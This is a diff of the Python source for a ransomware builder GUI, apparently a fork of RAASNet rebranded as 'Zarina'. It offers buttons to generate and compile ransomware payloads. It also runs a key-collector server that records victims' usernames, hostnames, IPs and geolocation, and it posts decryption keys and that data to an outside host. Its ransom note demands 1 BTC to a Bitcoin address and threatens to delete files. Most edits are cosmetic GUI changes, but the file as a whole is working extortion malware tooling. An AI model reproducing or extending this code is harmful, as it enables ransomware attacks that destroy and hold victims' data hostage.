@@ -1,9 +1,7 @@
 #!/usr/bin/env python3
-'''
-Zarina Will Run Only python 3 
-'''
 
 # Headers
+
 __author__ = "1337 Team"
 __copyright__ = "Copyright 2020-2021, "
 __license__ = "GPLv3"
@@ -13,6 +11,7 @@ __email__ = "root@sajibekanti.com"
 __status__ = "Production"
 
 import os, sys, subprocess, threading, time, datetime, socket, select, webbrowser, base64, platform, base64, requests, hashlib
+from geoip import geolite2
 from tkinter import *
 from tkinter.ttk import *
 from tkinter import messagebox
@@ -24,7 +23,6 @@ if platform.system() == 'Linux':
     from PIL import Image, ImageTk
 else:
     import PIL.Image, PIL.ImageTk
-
 
 from src.create_demon import *
 from src.create_decrypt import *
@@ -96,20 +94,23 @@ class HoverButton(tk.Button):
     def __init__(self, master, **kw):
         tk.Button.__init__(self,master=master,**kw)
         self['bg']                 = '#545b62'
+        self['highlightbackground']= '#545b62'
         self['activebackground']   = '#ef5350'
-        self['fg']                 = 'white'
+        self['fg']                 = 'blue'
+        self['font']               = 'papyrus 14 bold'
         self['relief']             = FLAT
-        self['pady']               = 10
-        self.defaultBackground     = self["bg"]
+        self.defaultBackground     = self['bg']
 
         self.bind("<Enter>", self.on_enter)
         self.bind("<Leave>", self.on_leave)
 
     def on_enter(self, e):
-        self['background'] = self['activebackground']
+        self['bg'] = self['activebackground']
+        self['highlightbackground'] = self['activebackground']
 
     def on_leave(self, e):
-        self['background'] = self.defaultBackground
+        self['bg'] = self.defaultBackground
+        self['highlightbackground'] = self.defaultBackground
 
 class Login(Tk):
     def __init__(self):
@@ -117,6 +118,8 @@ class Login(Tk):
         self.title(string = "Login")
         self.resizable(0,0)
         self.configure(background = 'white')
+        self.style = Style()
+        self.style.theme_use("clam")
 
         self.bind("<Escape>", self.exit) # Press ESC to quit app
 
@@ -132,7 +135,7 @@ class Login(Tk):
         }
 
         if platform.system() == 'Linux':
-            photo = Image.open('images/login_image.jpg')
+            photo = Image.open('images/login_img.png')
             resized = photo.resize((200,250), Image.ANTIALIAS)
             photo = ImageTk.PhotoImage(resized)
 
@@ -140,7 +143,7 @@ class Login(Tk):
             resized2 = photo2.resize((318,500), Image.ANTIALIAS)
             photo2 = ImageTk.PhotoImage(resized2)
         else:
-            photo = PIL.Image.open('images/login_image.png')
+            photo = PIL.Image.open('images/login_img.png')
             resized = photo.resize((200,250), PIL.Image.ANTIALIAS)
             photo = PIL.ImageTk.PhotoImage(resized)
 
@@ -156,18 +159,18 @@ class Login(Tk):
         label.image = photo # keep a reference!
         label.grid(row = 0, column = 0, columnspan = 2)
 
-        Label(self, text = 'Username', background = 'white', foreground = 'black', font='Helvetica 12 bold').grid(row = 1, column = 0, columnspan = 2)
+        Label(self, text = 'Username', background = 'white', foreground = 'black', font='Helvetica 16 bold').grid(row = 1, column = 0, columnspan = 2)
         self.a = Entry(self, textvariable = self.options['username'], width = 31)
         self.a.grid(row = 2, column = 0, columnspan = 2)
         self.a.focus()
 
-        Label(self, text = 'Password', background = 'white', foreground = 'black', font='Helvetica 12 bold').grid(row = 3, column = 0, columnspan = 2)
+        Label(self, text = 'Password', background = 'white', foreground = 'black', font='Helvetica 16 bold').grid(row = 3, column = 0, columnspan = 2)
         Entry(self, textvariable = self.options['pwd'], show = '*', width = 31).grid(row = 4, column = 0, columnspan = 2)
 
-        login_clk = HoverButton(self, text = 'Login', command = self.login, width = 35).grid(row = 5, column = 0, columnspan = 2, sticky = 'w')
-        register_clk = HoverButton(self, text = 'Register', command = self.register, width = 35).grid(row = 6, column = 0, columnspan = 2, sticky = 'w')
-        close = HoverButton(self, text = 'Exit', command = self.destroy, width = 35).grid(row = 7, column = 0, columnspan = 2, sticky = 'w')
-        contact = HoverButton(self, text = 'Contact', command = self.contact, width = 35).grid(row = 7, column = 2, columnspan = 2, sticky = 'e')
+        login_clk = HoverButton(self, text = 'Login', command = self.login, width = 18).grid(row = 5, column = 0, columnspan = 2, sticky = 'w')
+        register_clk = HoverButton(self, text = 'Register', command = self.register, width = 18).grid(row = 6, column = 0, columnspan = 2, sticky = 'w')
+        close = HoverButton(self, text = 'Exit', command = self.destroy, width = 18).grid(row = 7, column = 0, columnspan = 2, sticky = 'w')
+        contact = HoverButton(self, text = 'Contact', command = self.contact, width = 20).grid(row = 7, column = 2, columnspan = 2, sticky = 'e')
         self.bind("<Return>", self.login_event) # Press ESC to quit app
 
     def login_event(self, event):
@@ -252,10 +255,10 @@ class Login(Tk):
         self.options['reg_check_password'] = Entry(self.reg, textvariable = self.options['reg_check_password'], width = 30, show = '*')
         self.options['reg_check_password'].grid(row = 12, column = 0, columnspan = 2)
 
-        register_button = HoverButton(self.reg, text = 'Register', command = self.register_user, width = 35)
+        register_button = HoverButton(self.reg, text = 'Register', command = self.register_user, width = 18)
         register_button.grid(row = 13, column = 0, columnspan = 2)
         self.reg.bind('<Return>', self.register_user_event)
-        close_register = HoverButton(self.reg, text = 'Cancel', command = self.reg.destroy, width = 35).grid(row = 14, column = 0, columnspan = 2)
+        close_register = HoverButton(self.reg, text = 'Cancel', command = self.reg.destroy, width = 18).grid(row = 14, column = 0, columnspan = 2)
 
     def contact(self):
         self.contact = Toplevel()
@@ -266,11 +269,11 @@ class Login(Tk):
         #self.bind("<Escape>", self.close_contact) # Press ESC to quit app
 
         if platform.system() == 'Linux':
-            photo = Image.open(resource_path('images/1337.gif'))
+            photo = Image.open(resource_path('images/incsec_full.png'))
             resized = photo.resize((350,150), Image.ANTIALIAS)
             photo = ImageTk.PhotoImage(resized)
         else:
-            photo = PIL.Image.open(resource_path('images/1337.gif'))
+            photo = PIL.Image.open(resource_path('images/incsec_full.png'))
             resized = photo.resize((300,100), PIL.Image.ANTIALIAS)
             photo = PIL.ImageTk.PhotoImage(resized)
 
@@ -282,7 +285,7 @@ class Login(Tk):
         Label(self.contact, text = '@Sajibekantibd', background = 'white').grid(row = 1, column = 1, sticky = 'w')
 
         Label(self.contact, text = 'LinkedIn: ', background = 'white').grid(row = 2, column = 0, sticky = 'w')
-        Label(self.contact, text = '1337 Team', background = 'white').grid(row = 2, column = 1, sticky = 'w')
+        Label(self.contact, text = 'Sajibekantibd', background = 'white').grid(row = 2, column = 1, sticky = 'w')
 
         Label(self.contact, text = 'GitHub: ', background = 'white').grid(row = 3, column = 0, sticky = 'w')
         Label(self.contact, text = 'Sajibekanti', background = 'white').grid(row = 3, column = 1, sticky = 'w')
@@ -340,8 +343,10 @@ class Login(Tk):
 class MainWindow(Tk):
     def __init__(self, username, password, email, name, surname, rank, status):
         Tk.__init__(self)
-        self.title(string = "Zarina v%s" % __version__) # Set window title
+        self.title(string = "RAASNet v%s" % __version__) # Set window title
         self.resizable(0,0) # Do not allow to be resized
+        self.style = Style()
+        self.style.theme_use("clam")
 
         # Top menu
         menu = Menu(self)
@@ -463,30 +468,20 @@ flv
 iso
 zip
 tar
-html
-txt
-jpeg
-mp3
 tar.gz
 rar''')
 
-        self.options['msg'].set(''' Hello Dear!
+        self.options['msg'].set('''Your PC Infacted!
 
 Seems like you got hit by Zarian ransomware!
-
 Don't Panic, you get have your files back!
-
 Zarina uses a basic encryption script to lock your files.
 This type of ransomware is known as CRYPTO.
 You'll need a decryption key in order to unlock your files.
-
 Your files will be deleted when the timer runs out, so you better hurry.
 You have 10 hours to find your key
-
 Send 1 BTC To This Address : 1JBKLGyE6AnRGvk92A8x3m8qmXfh3fcEty
-
 Kind regards,
-
 1337 Team
 ''')
         self.options['img_base64'].set('''iVBORw0KGgoAAAANSUhEUgAAAlgAAAIOCAMAAABTb4MEAAAAY1BMVEVHcEy/v79/f39QUFBAQEAg
@@ -627,20 +622,20 @@ vV4t+0UE/G5fAN2ccz9Ug6PdAAAAAElFTkSuQmCC''')
         label.image = photo # keep a reference!
         label.grid(row = 0, column = 0)
 
-        Label(self, text = 'Zarina Generator', background = 'white', foreground = 'red', font='Helvetica 32 bold').grid(row = 1, column = 0)
+        Label(self, text = 'RAASNet Generator', background = 'white', foreground = 'red', font='papyrus 32 bold').grid(row = 1, column = 0)
 
         # Buttons
-        start_server = HoverButton(self, text = "START SERVER", command = self.open_server, width = 53).grid(row = 2, column = 0)
-        decrypt = HoverButton(self, text = "DECRYPT FILES", command = self.decrypt_files, width = 53).grid(row = 3, column = 0)
+        start_server = HoverButton(self, text = "START SERVER", command = self.open_server, width = 18).grid(row = 2, column = 0)
+        decrypt = HoverButton(self, text = "DECRYPT FILES", command = self.decrypt_files, width = 18).grid(row = 3, column = 0)
 
-        generate_demon = HoverButton(self, text = "GENERATE PAYLOAD", command = self.generate, width = 53).grid(row = 4, column = 0)
-        compile = HoverButton(self, text = "COMPILE PAYLOAD", command = self.compile, width = 53).grid(row = 5, column = 0)
+        generate_demon = HoverButton(self, text = "GENERATE PAYLOAD", command = self.generate, width = 18).grid(row = 4, column = 0)
+        compile = HoverButton(self, text = "COMPILE PAYLOAD", command = self.compile, width = 18).grid(row = 5, column = 0)
 
 
-        profile = HoverButton(self, text = "PROFILE", command = self.profile, width = 53)
+        profile = HoverButton(self, text = "PROFILE", command = self.profile, width = 18)
         profile.grid(row = 6, column = 0)
 
-        exit = HoverButton(self, text = "EXIT", command = self.exit, width = 53).grid(row = 7, column = 0)
+        exit = HoverButton(self, text = "EXIT", command = self.exit, width = 18).grid(row = 7, column = 0)
 
     def profile(self):
 
@@ -652,11 +647,11 @@ vV4t+0UE/G5fAN2ccz9Ug6PdAAAAAElFTkSuQmCC''')
         self.bind("<Escape>", self.close_profile) # Press ESC to quit app
 
         if platform.system() == 'Linux':
-            photo = Image.open(resource_path('images/1337.gif'))
+            photo = Image.open(resource_path('images/incsec_full.png'))
             resized = photo.resize((350,150), Image.ANTIALIAS)
             photo = ImageTk.PhotoImage(resized)
         else:
-            photo = PIL.Image.open(resource_path('images/1337.gif'))
+            photo = PIL.Image.open(resource_path('images/incsec_full.png'))
             resized = photo.resize((350,150), PIL.Image.ANTIALIAS)
             photo = PIL.ImageTk.PhotoImage(resized)
 
@@ -723,15 +718,15 @@ vV4t+0UE/G5fAN2ccz9Ug6PdAAAAAElFTkSuQmCC''')
             self.options['host'] == host
             self.options['port'] == port
 
-        go = HoverButton(self.set, text = 'Ok', command = self.run_server, width = 30)
+        go = HoverButton(self.set, text = 'Ok', command = self.run_server, width = 18)
         go.grid(row = 7, column = 0, columnspan = 2)
         self.set.bind('<Return>', self.set.destroy)
-        exit = HoverButton(self.set, text = 'Cancel', command = self.set.destroy, width = 30).grid(row = 8, column = 0, columnspan = 2)
+        exit = HoverButton(self.set, text = 'Cancel', command = self.set.destroy, width = 18).grid(row = 8, column = 0, columnspan = 2)
 
     def run_server(self):
         self.set.destroy()
         self.serv = Toplevel()
-        self.serv.title(string = 'Zarina Server - Key Collector')
+        self.serv.title(string = 'Demonware Server - Key Collector')
         self.serv.configure(background = 'white')
         self.serv.resizable(0,0)
         self.serv.protocol("WM_DELETE_WINDOW", self.close_server_by_click)
@@ -885,8 +880,8 @@ vV4t+0UE/G5fAN2ccz9Ug6PdAAAAAElFTkSuQmCC''')
 
         opt_frame = LabelFrame(self.comp, text = 'Finishing')
         opt_frame.grid(row = 2, column = 0, columnspan = 2, sticky='w')
-        finish = HoverButton(opt_frame, text = "FINISH", command = self.compile_payload, width = 75, height = 2).grid(row = 0, column = 0)
-        close_comp = HoverButton(opt_frame, text = 'Cancel', command = self.comp.destroy, width = 75).grid(row = 1, column = 0)
+        finish = HoverButton(opt_frame, text = "FINISH", command = self.compile_payload, width = 18, height = 2).grid(row = 0, column = 0)
+        close_comp = HoverButton(opt_frame, text = 'Cancel', command = self.comp.destroy, width = 18).grid(row = 1, column = 0)
 
         if platform.system() == 'Windows':
             self.options['os'].set('windows')
@@ -1262,15 +1257,21 @@ vV4t+0UE/G5fAN2ccz9Ug6PdAAAAAElFTkSuQmCC''')
                             user = data.split('$')[3]
                             hostname = data.split('$')[4]
                             if ip:
-                                lookup = self.get_ip_data(ip)
-                                con = lookup.split(',')[0]
-                                country = lookup.split(',')[1]
-                                region = lookup.split(',')[2]
-                                city = lookup.split(',')[3]
-                                isp = lookup.split(',')[4]
-                                zip = lookup.split(',')[5]
-                                lat = lookup.split(',')[6]
-                                lon = lookup.split(',')[7]
+                                lookup = geolite2.lookup(addr[0])
+                                try:
+                                    con = lookup.continent
+                                except:
+                                    con = 'Error - Fail'
+                                try:
+                                    country = lookup.country
+                                except:
+                                    country = 'Error - Fail'
+                                try:
+                                    lat = lookup.location[0]
+                                    lon = lookup.location[1]
+                                except:
+                                    lat = 'Error - Fail'
+                                    lon = 'Error - Fail'
 
                             result = '''
 [Occured]    -> %s %s
@@ -1282,10 +1283,6 @@ vV4t+0UE/G5fAN2ccz9Ug6PdAAAAAElFTkSuQmCC''')
 [Local IP]   -> %s
 [Continent]  -> %s
 [Country]    -> %s
-[Region]     -> %s
-[City]       -> %s
-[ISP]        -> %s
-[ZIP]        -> %s
 
 ''' % (time.strftime('%d/%m/%Y'),
         time.strftime('%X'),
@@ -1296,11 +1293,7 @@ vV4t+0UE/G5fAN2ccz9Ug6PdAAAAAElFTkSuQmCC''')
         ip,
         local,
         con,
-        country,
-        region,
-        city,
-        isp,
-        zip)
+        country)
 
                             self.serv.options['log'].insert(END, result, 'yellow')
                             self.serv.options['log'].see(END)
@@ -1320,7 +1313,7 @@ vV4t+0UE/G5fAN2ccz9Ug6PdAAAAAElFTkSuQmCC''')
 
 
                             #if save_keys == 1:
-                            payload = {'user' : self.options['username'].get(), 'pwd' : self.options['password'].get(), 'Occured': time.strftime('%d/%m/%Y') + ' ' + time.strftime('%X'), 'Username' : user, 'OS' : system, 'Hostname' : hostname, 'Key' : key, 'IP' : ip, 'LocalIP' : local, 'Continent' : con, 'Country' : country, 'Region' : region, 'City' : city , 'ISP' : isp, 'ZIP' : zip, 'lat' : lat, 'lon' : lon}
+                            payload = {'user' : self.options['username'].get(), 'pwd' : self.options['password'].get(), 'Occured': time.strftime('%d/%m/%Y') + ' ' + time.strftime('%X'), 'Username' : user, 'OS' : system, 'Hostname' : hostname, 'Key' : key, 'IP' : ip, 'LocalIP' : local, 'Continent' : con, 'Country' : country, 'lat' : lat, 'lon' : lon}
                             r = requests.post('https://zeznzo.nl/post.py', data=payload)
                         else:
                             break
@@ -1342,7 +1335,7 @@ vV4t+0UE/G5fAN2ccz9Ug6PdAAAAAElFTkSuQmCC''')
 
     def insert_banner(self):
         banner = '''
-                        .:'                                  `:.
+                         .:'                                  `:.
                          ::'                                    `::
                         :: :.                                  .: ::
                          `:. `:.             .             .:'  .:'
@@ -1372,45 +1365,8 @@ vV4t+0UE/G5fAN2ccz9Ug6PdAAAAAElFTkSuQmCC''')
         | (__/  )| (____/\| )   ( || (___) || )  \  || () () || )   ( || ) \ \__| (____/\\
         (______/ (_______/|/     \|(_______)|/    )_)(_______)|/     \||/   \__/(_______/
         '''
-    self.serv.options['log'].insert('1.0', banner + '\n', 'red')
-    def get_ip_data(self, ip):
-        url = 'http://ip-api.com/json/%s?fields=status,message,continent,continentCode,country,countryCode,region,regionName,city,district,zip,lat,lon,timezone,currency,isp,org,as,asname,reverse,mobile,proxy,query' % ip
-        try:
-            r = requests.get(url, timeout = 5)
-        except Exception as e:
-            con = 'Error - Fail'
-            country = 'Error - Fail'
-            region = 'Error - Fail'
-            city = 'Error - Fail'
-            isp = 'Error - Fail'
-            zip = 'Error - Fail'
-            lat = 'Error - Fail'
-            lon = 'Error - Fail'
-            return '%s,%s,%s,%s,%s,%s,%s,%s' % (con, country, region, city, isp, zip, lat, lon)
 
-
-        data = r.json()
-
-        if r.status_code == 200 and data['status'] == 'success':
-            con = data['continent'] + ' (' + data['continentCode'] + ')'
-            country = data['country'] + ' (' + data['countryCode'] + ')'
-            region = data['regionName']
-            city = data['city']
-            isp = data['isp'].replace(',', '')
-            zip = data['zip']
-            lat = data['lat']
-            lon = data['lon']
-        else:
-            con = 'Error - Fail'
-            country = 'Error - Fail'
-            region = 'Error - Fail'
-            city = 'Error - Fail'
-            isp = 'Error - Fail'
-            zip = 'Error - Fail'
-            lat = 'Error - Fail'
-            lon = 'Error - Fail'
-
-        return '%s,%s,%s,%s,%s,%s,%s,%s' % (con, country, region, city, isp, zip, lat, lon)
+        self.serv.options['log'].insert('1.0', banner + '\n', 'red')
 
     def close_profile(self, event):
         self.prof.destroy()
@@ -1438,10 +1394,10 @@ vV4t+0UE/G5fAN2ccz9Ug6PdAAAAAElFTkSuQmCC''')
         self.dirs.destroy()
 
     def open_github(self):
-        webbrowser.open_new_tab('https://www.github.com/Sajibekanti')
+        webbrowser.open_new_tab('https://www.github.com/leonv024/RAASNet')
 
     def open_buy(self):
-        webbrowser.open_new_tab('https://www.sajibekanti.com')
+        webbrowser.open_new_tab('https://www.zeznzo.nl/')
 
     def exit(self):
         sys.exit(0)
